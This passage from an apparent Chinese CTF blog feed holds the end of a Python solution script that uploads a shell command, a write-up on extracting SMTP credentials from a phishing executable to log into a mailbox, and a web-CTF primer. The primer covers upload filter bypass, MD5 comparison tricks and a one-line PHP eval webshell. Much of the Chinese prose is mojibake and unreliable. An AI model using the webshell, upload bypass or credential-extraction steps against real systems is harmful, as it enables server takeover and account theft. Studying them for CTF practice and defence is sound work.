class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                æ‰“å¼€æ ¹ç›®å½•ä¸‹å…¨éƒ¨æ–‡ä»¶å¹¶æ˜¾ç¤ºåœ¨æ ‡å‡†è¾“å‡º</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   æŸ¥æ‰¾å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#                             â†“      â†“</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 â†‘         â†‘       â†‘</span></span><br><span class="line"><span class="comment">#                 |       æ¢è¡Œç¬¦   pipeï¼Œä»¥å‰é¢çš„è¿”å›ä½œä¸ºå‚æ•°æ¥æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œç›¸å½“äºåœ¨æ ¹ç›®å½•é‡Œæ‰¾flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç¤ºç¬¦ï¼Œå…¶åè·Ÿç€è§£é‡Šæ­¤è„šæœ¬çš„shellè·¯å¾„</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku ç¤¾å·¥-åˆæ­¥æ”¶é›†</title>
      <link href="2021/03/24/bugku%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/"/>
      <url>2021/03/24/bugku%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>çœŸçš„æ˜¯éå¸¸æœ‰è¶£å•ŠğŸ‘</p><p align='right'><small>ä½œè€…è¯´è¿™ä¸ªé¢˜æ›´åƒæ˜¯MISCç±»...yysyï¼Œqs</small></p><span id="more"></span><h1 id="ç¤¾å·¥-åˆæ­¥æ”¶é›†"><a href="#ç¤¾å·¥-åˆæ­¥æ”¶é›†" class="headerlink" title="ç¤¾å·¥-åˆæ­¥æ”¶é›†"></a>ç¤¾å·¥-åˆæ­¥æ”¶é›†</h1><h2 id="ç½‘é¡µåˆ†æ"><a href="#ç½‘é¡µåˆ†æ" class="headerlink" title="ç½‘é¡µåˆ†æ"></a>ç½‘é¡µåˆ†æ</h2><ul><li><p>è¿›æ¥å‘ç°æ˜¯åˆ·é’»è½¯ä»¶çš„indexï¼Œå…¶ä¸­æœ‰ä¸€åœ°å€å¯ä»¥ä¸‹è½½ä¸€ä¸ªæ˜“è¯­è¨€å†™çš„exe</p><p>  <img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-index.PNG"></p></li><li><p>æ‰‹åŠ¨æ·»åŠ adminå‘ç°ç®¡ç†é¡µé¢å­˜åœ¨ï¼Œä½†æ˜¯ä¸€æ—¦å°è¯•æ³¨å…¥å°±ä¼šå¡æ­»(è‡³å°‘æˆ‘æ˜¯è¿™æ ·çš„)</p></li></ul><p>è‡³æ­¤ï¼Œå…¶ä»–çš„ä¿¡æ¯å‡ä¸ºå¹²æ‰°ï¼Œå†æ²¡æœ‰å‘ç°ä»»ä½•çº¿ç´¢ï¼Œå¾ˆæ˜¾ç„¶åˆ·é’»exeæ‰æ˜¯å…³é”®</p><h2 id="exeåˆ†æ"><a href="#exeåˆ†æ" class="headerlink" title="exeåˆ†æ"></a>exeåˆ†æ</h2><h3 id="æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…"><a href="#æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…"></a>æ–¹æ³•ä¸€ï¼šæŠ“smtpåŒ…</h3><p>å…ˆçœ‹æœ¬ä½“ï¼Œå°±æ˜¯ä¸€ä¸ªé’“é±¼è½¯ä»¶</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-exe.PNG"></p><p>æœ€ç®€å•ä¹Ÿæ˜¯æœ€å¸¸è§çš„é’“é±¼å°±æ˜¯ç”¨smtpå‘é‚®ä»¶å‡ºå»ï¼Œä½†åœ¨é€šè¿‡smtpé€ä¿¡æ—¶æ˜¯éœ€è¦smtpæˆæƒç çš„ï¼Œæ•…åªè¦æŠ“ä¸ªsmtpåŒ…çœ‹é‚®ç®±å’Œå¯†ç å³å¯</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-pack.PNG"></p><p>å…³é”®å­—<code>AUTH LOGIN</code>ç™»å½•è®¤è¯ï¼Œå°†ä¸‹æ–‡çš„å‘é€çš„å­—æ®µb64decodeä¸€ä¸‹ï¼Œå¾—åˆ°é‚®ç®±ä¸å¯†ç </p><h3 id="æ–¹æ³•äºŒï¼šIDA"><a href="#æ–¹æ³•äºŒï¼šIDA" class="headerlink" title="æ–¹æ³•äºŒï¼šIDA"></a>æ–¹æ³•äºŒï¼šIDA</h3><p>é™¤äº†æŠ“åŒ…æŸ¥çœ‹é‚®ç®±ä¸å¯†ç ï¼Œåœ¨exeä¸­çš„é‚®ç®±å’Œå¯†ç ä¹Ÿæ˜¯ä¿å­˜ä¸ºé™æ€å­—æ®µçš„ï¼Œæ‹–è¿›IDAå»å­—ç¬¦ä¸²é¡µé¢æ‰¾å³å¯</p><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-IDA.PNG"></p><h2 id="ç™»å½•é‚®ç®±"><a href="#ç™»å½•é‚®ç®±" class="headerlink" title="ç™»å½•é‚®ç®±"></a>ç™»å½•é‚®ç®±</h2><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ‰¾åˆ°çš„æ˜¯smtpæˆæƒç ï¼Œè€Œéé‚®ç®±çš„ç™»é™†å¯†ç ï¼Œæ•…ä¸èƒ½åœ¨ç½‘æ˜“é‚®ç®±ç›´æ¥ç™»å½•ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯è™½ç„¶çŸ¥é“smtpæˆæƒç å’Œç™»é™†å¯†ç æ˜¯ä¸¤ç äº‹ï¼Œä½†æ˜¯è¿˜æ˜¯è¯•äº†å¥½ä¹…ï¼‰ï¼Œé¢å‘æœç´¢å¼•æ“è§£é¢˜æˆ‘ä»¬å¾—çŸ¥åº”è¯¥ç”¨ç¬¬ä¸‰æ–¹çš„é‚®ç®±å®¢æˆ·ç«¯ï¼Œå¹¶é€‰æ‹©ä½¿ç”¨smtpåè®®ç™»å½•ï¼Œä¾‹å¦‚<code>FoxMail</code>ï¼Œç™»å½•åå¯ä»¥æ‰¾åˆ°ç®¡ç†å‘˜è¡¥æ¡£çš„è¢«åˆ é™¤çš„emlæ ¼å¼çš„é™„ä»¶ï¼Œfoxmailæœ¬èº«æˆ–å¾®è½¯è‡ªå¸¦é‚®ç®±å°±å¯ä»¥æ‰“å¼€</p><blockquote>EMLæ ¼å¼æ˜¯å¾®è½¯å…¬å¸åœ¨Outlookä¸­æ‰€ä½¿ç”¨çš„ä¸€ç§éµå¾ªRFC822åŠå…¶åç»­æ‰©å±•çš„æ–‡ä»¶æ ¼å¼ï¼Œå¹¶æˆä¸ºå„ç±»ç”µå­é‚®ä»¶è½¯ä»¶çš„é€šç”¨æ ¼å¼â€”â€”ç™¾åº¦ç™¾ç§‘</blockquote><p><img src="/images/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86-mail.PNG"></p><p>æ‰“å¼€é™„ä»¶åä¸ºé‚®ä»¶å¯¹è¯æˆªå›¾ï¼Œå¥½å¿ƒçš„ç®¡ç†è¿˜ç”»å‡ºäº†å…³é”®ä¿¡æ¯ï¼Œç»“åˆé¢˜ç›®ä¸­æåˆ°â€œç¤¾å·¥â€ï¼Œæ˜¾ç„¶æ­¤å¤„äº¤ä»£äº†åå°ç®¡ç†çš„ç”¨æˆ·åå³ä¸ºå‘ä»¶äººç½²åï¼Œå¯†ç ä¸ºç”Ÿæ—¥å¯†ç ï¼Œä»¥æ­¤ç™»å½•åå°åç¨å¾®ç¿»ç¿»å°±çœ‹åˆ°flagå•¦~</p><p align='right'><small>éå¸¸æœ‰è¶£</small></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Basic Requirement</title>
      <link href="2021/03/16/WebBasicRequirement/"/>
      <url>2021/03/16/WebBasicRequirement/</url>
      
        <content type="html"><![CDATA[<p>ç³»ç»Ÿæ€§æ”¶å½•è§£å†³Webé¢˜ç›®éœ€è¦çš„å‰ç½®çŸ¥è¯†ï¼Œè¿‡äºé›¶ç¢çš„çŸ¥è¯†æœªæ•´åˆ</p><span id="more"></span><hr><h1 id="PHP-amp-HTTP"><a href="#PHP-amp-HTTP" class="headerlink" title="PHP&amp;HTTP"></a><big><center>PHP&amp;HTTP</center></big></h1><p align="right"><small>PHP is the best language in the world</small></p><h2 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie,session,token"></a><big>cookie,session,token</big></h2><p>è¿™ä¸‰ä¸ªä¸œè¥¿çš„æœ€åŸºæœ¬çš„ç›®çš„éƒ½æ˜¯åŒºåˆ†ç”¨æˆ·ï¼Œæ ‡è¯†èº«ä»½ï¼Œå½¢å¼ä¸åŒè€Œå·²</p><ul><li><p>cookieï¼šå°é¥¼å¹²ï¼ŒæŒ‰F12å°±å¯ä»¥æ‰¾åˆ°å½“å‰é¡µé¢å­˜æ”¾çš„cookieï¼Œæœ¬åœ°ç¼“å­˜ï¼Œç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œåœ¨ä¸‹æ¬¡è¯·æ±‚æ—¶åˆå‘å›æœåŠ¡å™¨ã€‚ç”±äºcookieæ˜¯å­˜åœ¨å®¢æˆ·ç«¯ä¸Šçš„ï¼Œæ‰€ä»¥æµè§ˆå™¨åŠ å…¥äº†ä¸€äº›é™åˆ¶ç¡®ä¿cookieä¸ä¼šè¢«æ¶æ„ä½¿ç”¨ï¼ŒåŒæ—¶ä¸ä¼šå æ®å¤ªå¤šç£ç›˜ç©ºé—´ï¼Œæ‰€ä»¥æ¯ä¸ªåŸŸçš„cookieæ•°é‡æ˜¯æœ‰é™çš„ã€‚ç”±äºcookieæ˜¯äººä¸ºè®¾ç½®çš„ï¼Œæ‰€ä»¥cookieä¸­å¯èƒ½è—æœ‰é¢˜ç›®çš„hint</p></li><li><p>sessionï¼šä¼šè¯ï¼ŒæœåŠ¡ç«¯ä¸´æ—¶ç¼“å­˜ç”¨æˆ·çš„æ•°æ®ï¼Œç”¨æˆ·ç¦»å¼€ç½‘ç«™åç«‹å³é”€æ¯ï¼Œpython requestsä¸­å°±æœ‰ä¿ç•™ä¼šè¯çš„æ–¹æ³•</p></li></ul><p><img src="/images/session.jpg"></p><ul><li>tokenï¼šå› ä¸ºå½“ç”¨æˆ·æ›´æ¢è®¿é—®çš„æœåŠ¡å™¨æ—¶ï¼Œè‹¥sessionæ²¡æœ‰åŒæ­¥åˆ°ä½ï¼Œåˆ™ç”¨æˆ·åˆéœ€è¦é‡æ–°ç™»é™†ï¼Œtoken å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚å®ƒå°†çŠ¶æ€ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å€ŸåŠ©åŠ å¯†ç®—æ³•è¿›è¡ŒéªŒè¯ä¿è¯å®‰å…¨æ€§</li></ul><p><img src="/images/token.jpg"></p><h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a><big>HEADER</big></h2><p>å“åº”å¤´ï¼Œæ˜¯æœåŠ¡å™¨ä»¥HTTPåè®®ä¼ HTMLèµ„æ–™åˆ°æµè§ˆå™¨å‰æ‰€é€å‡ºçš„å­—ä¸²ï¼Œä¾¿äºæå‰åˆ¤æ–­æ˜¯å¦æ¥å—è¯·æ±‚ä»¥åŠè¯·æ±‚çš„å¤§è‡´ä¿¡æ¯ä¸å±æ€§ï¼ŒæŒ‰F12å°±å¯ä»¥æŸ¥çœ‹å½“å‰é¡µé¢çš„HEADERï¼ŒHEADERå¯ä»¥è‡ªå®šä¹‰ï¼Œå¯èƒ½åŒ…å«äº†é¢˜ç›®çš„hint</p><p>å…¶ä¸­æœ‰å‡ ä¸ªé‡è¦çš„HEADERéœ€è¦äº†è§£</p><ul><li><code>X-Forwarded-for</code>ï¼šXFFå¤´ï¼Œå«HTTPè¯·æ±‚ç«¯çš„IPï¼Œä½†å½“ä»…ä½¿ç”¨è¿™ä¸€å“åº”å¤´æ¥éªŒè¯è¯·æ±‚æ®µçš„çœŸå®IPæ—¶æ˜¯ä¸å¯é çš„</li><li><code>Referer</code>ï¼šå‘Šè¯‰æœåŠ¡å™¨è¯·æ±‚æ¥è‡ªå“ªä¸ªé“¾æ¥</li><li><code>Content-type</code>ï¼šå†…å®¹ç±»å‹ï¼Œç”¨äºå®šä¹‰ç½‘ç»œæ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæ–‡ä»¶æ¥æ”¶æ–¹å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­å¸¸é€šè¿‡æ›´æ”¹æ­¤ headerä¼ªé€ æ–‡ä»¶ç±»å‹æ ‡è¯†ï¼Œè¯·æ±‚å¤´éƒ¨ä¸­çš„Content-typeå¯ç”¨å¤§å°å†™ç»•è¿‡ï¼Œå¦‚Content-Type: multipart/form-data;æ›¾åœ¨ä¸€ä¸ªé¢˜ç›®ä¸­å°† multipartä¸­çš„éƒ¨åˆ†å­—æ¯æ”¹ä¸ºå¤§å†™å³å¯ä¸Šä¼ æ–‡ä»¶ï¼›è€Œè¯·æ±‚æ•°æ®ä¸­çš„Content-typeåˆ™ç›´æ¥å¤åˆ¶ç²˜è´´å³å¯ï¼Œä¸åŒçš„åç¼€åå‡æœ‰å¯¹åº”çš„æè¿°ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­æˆªåŒ…åä¿®æ”¹Content-typeå¤´ï¼Œå¹¶åˆ©ç”¨PHPä¸ä»…å¯ä»¥è§£æ.PHPæ–‡ä»¶ï¼ŒåŒ…æ‹¬.PHP2~.PHP5åç¼€çš„æ–‡ä»¶PHPéƒ½å¯ä»¥è§£æï¼Œæ¥ç»•è¿‡å¯¹.PHPåç¼€çš„è¿‡æ»¤ï¼Œå¹¶æˆåŠŸä¸Šä¼ </li></ul><img src="/images/WebshellUpload.png" style="zoom: 67%;" /><h2 id="PHPæ ‡ç­¾å†™æ³•"><a href="#PHPæ ‡ç­¾å†™æ³•" class="headerlink" title="PHPæ ‡ç­¾å†™æ³•"></a><big>PHPæ ‡ç­¾å†™æ³•</big></h2><p>â€‹    æœ‰æ—¶å¸¸è§çš„ phpæ ‡ç­¾ä¼šè¢«è¿‡æ»¤æ‰ï¼Œè¿™å°±éœ€è¦å°è¯•æ›´æ¢å…¶ä»–æ ‡ç­¾æ¥è¿›è¡Œå°è¯•</p><p>â€‹    &lt;?php echo â€˜hiâ€™; ?&gt;  æ ‡å‡†å†™æ³•</p><p>â€‹    &lt;script language=â€phpâ€&gt; echo 1; &lt;/script&gt;  é•¿æ ‡ç­¾å†™æ³•ï¼Œåœ¨ php7.0åå°±ä¸è§£æäº†</p><h2 id="æ¾æ•£æ¯”è¾ƒ"><a href="#æ¾æ•£æ¯”è¾ƒ" class="headerlink" title="æ¾æ•£æ¯”è¾ƒ"></a><big>æ¾æ•£æ¯”è¾ƒ</big></h2><p>PHPä¸­çš„æ¯”è¾ƒåˆ†ä¸ºå¼±æ¯”è¾ƒï¼ˆ==ï¼Œ!=ï¼‰ä¸å¼ºæ¯”è¾ƒï¼ˆ===ï¼Œ!==ï¼‰ä¸¤ç§æ–¹å¼ï¼Œå› ä¸ºPHPä¸­çš„å˜é‡ä¸ç”¨å£°æ˜å…¶æ•°æ®ç±»å‹ï¼Œå¯¼è‡´äº†åœ¨å¼±æ¯”è¾ƒä¸­çš„é€‚åº”æ€§å˜åŒ–</p><img src="/images/PHPå¼±æ¯”è¾ƒè¡¨.png" style="zoom: 50%;" /><p>éœ€è¦è¡¥å……çš„æ˜¯æ•°å­—ä¸å­—ç¬¦ä¸²çš„å¼±æ¯”è¾ƒï¼Œåœ¨è¿›è¡Œè¿™ç±»æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆå°è¯•å°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ï¼Œè½¬æ¢è§„åˆ™ä¸ºï¼šè‹¥ä¸ºéæ•°å­—å¼€å¤´ï¼Œåˆ™è½¬æ¢ä¸º<code>0</code>ï¼Œè‹¥ä¸ºæ•°å­—å¼€å¤´ï¼Œåˆ™è½¬æ¢ä¸ºå¼€å¤´çš„æ•°å­—ï¼Œä»¥ä¸‹ä¸ºç¤ºä¾‹ï¼š</p><center><code>"abd"---0</code></center><center><code>"123abc"---123</code></center><center><code>"123.456abc"---123.456</code></center><center><code>"123e4abc"---123e4</code></center><center><code>"233a233"---233</code></center><p>è¿™æ ·çš„æ¯”è¾ƒï¼Œå°¤å…¶æ˜¯å­—ç¬¦ä¸²è½¬æ•°å­—æ—¶ç§‘å­¦è®¡æ•°æ³•çš„è¯†åˆ«ï¼Œä¸ºmd5çš„ç»•è¿‡åŸ‹ä¸‹ä¼ç¬”</p><p>è€Œå¼ºæ¯”è¾ƒä¼šå…ˆåˆ¤æ–­æ•°æ®ç±»å‹æ˜¯å¦ä¸€è‡´ï¼Œåœ¨è‹¥ä¸€è‡´æ‰è¿›è¡Œå¯¹å€¼çš„åˆ¤æ–­ï¼Œå¦åˆ™ç›´æ¥è¿”å›false</p><h2 id="HASHç¢°æ’ä¸ç»•è¿‡"><a href="#HASHç¢°æ’ä¸ç»•è¿‡" class="headerlink" title="HASHç¢°æ’ä¸ç»•è¿‡"></a><big>HASHç¢°æ’ä¸ç»•è¿‡</big></h2><p>MD5ç ç”±<code>32</code>ä¸ªå­—æ¯æˆ–æ•°å­—ç»„æˆï¼Œå› å…¶ç¢°æ’æ¦‚ç‡ç›¸å¯¹è¾ƒå¤§ï¼Œç°å·²æ˜¯ä¸€ç§ä¸å¤ªå¯é çš„Hashç®—æ³•ã€‚é’ˆå¯¹PHPä¸­çš„å¼±æ¯”è¾ƒï¼Œå¼ºæ¯”è¾ƒï¼Œä»¥åŠmd5()å‡½æ•°çš„ç‰¹æ€§ï¼Œæœ‰å‡ ç§å¸¸ç”¨çš„ç»•è¿‡æ–¹å¼ã€‚</p><ul><li><p>MD5å¼±æ¯”è¾ƒï¼š0eå¼€å¤´ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œ<code>md5(aabg7XSs)</code>ä¸ <code>md5(QNKCDZO)</code>çš„è¿”å›å€¼å‡ä¸º 0eå¼€å¤´ï¼›md4ä¸­ä¹Ÿæœ‰<code>md4(0e251288019)</code>ä¸º<code>0e</code>å¼€å¤´</p></li><li><p>åŒMD5ï¼š<code>md5($a)===md5(md5($b));</code>ï¼Œä¼ å‚ï¼š<code>a=&amp;b[]=</code></p></li><li><p>MD5ä¸SHA1æ•°ç»„ç»•è¿‡ï¼šMD5()ä¸SHA1()éƒ½ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œç›¸å½“äºè¿”å›äº†NULLï¼Œè™½ç„¶ä¼šäº§ç”ŸWARNINGï¼Œä½†å®ƒä¼šç»§ç»­æ‰§è¡Œå•Šï¼Œäºæ˜¯å°±è¿™ä¹ˆç»•è¿‡äº†ï¼Œç”šè‡³éª—è¿‡å¼ºç­‰äºã€‚è‡³äºä¼ å‚ï¼Œå†™æˆï¼ša[]=233&amp;b[]=Oopså³å¯</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">233</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>)===md5(<span class="variable">$b</span>))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;it s ok&#x27;</span>;</span><br></pre></td></tr></table></figure>  <blockquote>[Out]<br>it s ok</blockquote></li></ul><ul><li><p>MD5ç¢°æ’ï¼šæœ€ç»å…¸çš„æ˜¯è¿™ä¸¤ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexString1</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$hexString2</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br><span class="line"></span><br><span class="line">hex2bin(<span class="variable">$hexString1</span>)===hex2bin(<span class="variable">$hexString2</span>);<span class="comment">//False</span></span><br><span class="line">md5(hex2bin(<span class="variable">$hexString1</span>))===md5(hex2bin(<span class="variable">$hexString2</span>));<span class="comment">//True</span></span><br><span class="line"><span class="comment">//éƒ½æ˜¯008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//hex2bin()ï¼Œåå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¦æ±‚php version&gt;=5.4</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="è¶…å…¨å±€å˜é‡"><a href="#è¶…å…¨å±€å˜é‡" class="headerlink" title="è¶…å…¨å±€å˜é‡"></a><big>è¶…å…¨å±€å˜é‡</big></h2><p>ä¹‹æ‰€ä»¥å«åšè¶…å…¨å±€å˜é‡ï¼Œæ˜¯å› ä¸ºå®ƒä»¬åœ¨ä¸€ä¸ªè„šæœ¬çš„å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ç”¨ï¼Œå¸¸è§çš„è¶…å…¨å±€å˜é‡æœ‰ï¼š</p><center><code>$_GET,$_POST,$_REQUEST,$GLOBALSç­‰</code></center><ul><li><p>GETä¼ å‚æ–¹å¼ä¸ºåœ¨urlååŠ  <code>/?var_name=value</code>ï¼Œæ³¨æ„éœ€è¦urlç¼–ç </p></li><li><p>POSTä¼ å‚æ–¹å¼ä¸ºé¡µé¢å†…æäº¤è¡¨å•æˆ–ç”¨curlï¼Œpython requestsï¼Œhackbarç­‰å·¥å…·ï¼Œé€šå¸¸ä¸ç”¨è¿›è¡Œurlç¼–ç å†ä¼ è¾“ï¼Œå–å†³äºHTTP HEADERä¸­çš„â€Content-Typeâ€œï¼Œè‹¥ä¸ºâ€œmultipart/form-dataâ€åˆ™ä¸éœ€è¦ï¼Œè‹¥ä¸ºâ€œapplication/x-www-form-urlencodedâ€åˆ™éœ€è¦</p></li><li><p>REQUESTçš„ä¼ å‚æ–¹å¼åŒ…æ‹¬GETå’ŒPOST</p></li><li><p>$GLOBALS[index] ä½œä¸ºæ•°ç»„ï¼Œå­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ï¼Œå˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„indexï¼ŒåŒ…æ‹¬ä¹‹å‰è¯´åˆ°çš„$_GETï¼Œ$_POSTï¼Œä»¥åŠ {å®šä¹‰åœ¨å½“å‰é¡µé¢å†…ï¼Œåœ¨å‡½æ•°å¤–ï¼Œéç±»æˆå‘˜} çš„å˜é‡ã€‚å¯¹äºç±»ä¸­çš„æˆå‘˜å˜é‡ï¼Œç±»ä¸­å‡½æ•°å¿…é¡»ä½¿ç”¨$this-&gt;çš„æ–¹å¼è®¿é—®ï¼Œä¸èƒ½ç”¨$GLOBALSæ–¹å¼</p><p>  <img src="/images/%E5%89%8D%E7%AB%AF%E8%87%B3%E5%90%8E%E7%AB%AF%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B.png"></p></li></ul><h2 id="æ­£åˆ™è¡¨è¾¾-regex"><a href="#æ­£åˆ™è¡¨è¾¾-regex" class="headerlink" title="æ­£åˆ™è¡¨è¾¾-regex"></a><big><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md">æ­£åˆ™è¡¨è¾¾-regex</a></big></h2><p>â€‹    <em>åŸºæœ¬çš„æ­£åˆ™è¡¨è¾¾å‚è€ƒé“¾æ¥ï¼Œåœ¨ PHPä¸­å­˜åœ¨éå¸¸è§„çš„æ­£åˆ™è¡¨è¾¾æ ‡è¯†ï¼Œå¦‚ä¸‹è¡¨</em></p><table><thead><tr><th>å­—ç¬¦</th><th>åŒ¹é…é¡¹ç›®</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>åŒ¹é…ä»»ä½•å­—æ¯å’Œæ•°å­—</td></tr><tr><td>[:alpha:]</td><td>åŒ¹é…ä»»ä½•å­—æ¯</td></tr><tr><td>[:blank:]</td><td>åŒ¹é…blank, tabç­‰ç©ºæ ¼ç¬¦</td></tr><tr><td>[:punct:]</td><td>åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å· â€˜! â€œ # $ % &amp; â€˜ ( ) * + , - . / : ; &lt; = &gt; ? @ [ \ ] ^ _ â€˜ { | } ~â€™.</td></tr><tr><td>[:digit:]</td><td>åŒ¹é…ä»»ä½•æ•°å­—</td></tr><tr><td>[:graph:]</td><td>Graphical characters: â€˜[:alnum:]â€™ and â€˜[:punct:]â€™.</td></tr><tr><td>[:lower:]</td><td>åŒ¹é…ä»»ä½•å°å†™å­—æ¯</td></tr><tr><td>[:upper:]</td><td>åŒ¹é…ä»»ä½•å¤§å†™å­—æ¯</td></tr><tr><td>[:print:]</td><td>Printable characters: â€˜[:alnum:]â€™, â€˜[:punct:]â€™, and space.</td></tr></tbody></table><h2 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a><big>ä¸€å¥è¯æœ¨é©¬</big></h2><center><code>&lt;?php @eval($_P0ST['key']) ?&gt;</code></center><p><del>å› ä¸ºç›´æ¥å†™ä¸Šå»ä¼šè¢«æŠ¥æ¯’ï¼Œæ‰‹åŠ¨æŠŠæ•°å­—0æ”¹ä¸ºå­—æ¯Oå°±è¡Œ</del></p><p>åŸç†åœ¨äºï¼šå½“æœ‰å†™å…¥äº†è¿™æ ·ä»£ç çš„æ–‡ä»¶èƒ½å¤Ÿè¢«æœåŠ¡å™¨è§£æï¼Œä¸”è§£ææ–‡ä»¶çš„é¡µé¢å¯ä»¥è®¿é—®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘è¯¥é¡µé¢POSTä¸€ä¸ªkeyï¼Œå…¶å€¼è®¾ä¸ºä»»æ„å¸Œæœ›æœåŠ¡å™¨æ‰§è¡Œçš„PHPä»£ç ç„¶åè¢«evalæ‰§è¡Œï¼›åŸºäºæ­¤ï¼Œèœåˆ€ï¼Œèšå‰‘ç­‰ Webshellå·¥å…·å¯ä»¥è¿æ¥æœåŠ¡å™¨åå°</p><h2 id="swpå¤‡ä»½æ–‡ä»¶"><a href="#swpå¤‡ä»½æ–‡ä»¶" class="headerlink" title=".swpå¤‡ä»½æ–‡ä»¶"></a><big>.swpå¤‡ä»½æ–‡ä»¶</big></h2><p>Linuxä¸­ Vimç¼–è¾‘å™¨äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œç”¨äºå¤‡ä»½è¢«ç¼–è¾‘çš„å†…å®¹ä»¥é˜²éæ­£å¸¸é€€å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -r 